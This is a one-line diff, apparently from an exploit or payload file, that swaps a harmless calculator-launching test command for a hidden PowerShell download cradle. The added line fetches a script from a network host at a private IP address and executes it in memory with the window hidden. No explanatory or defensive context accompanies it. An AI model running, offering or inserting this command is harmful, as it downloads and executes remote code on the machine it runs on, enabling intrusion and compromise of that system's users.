@@ -1,1 +1,1 @@
-cmd.exe /c calc.exe
+powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('http://192.168.80.128:80/a'))"
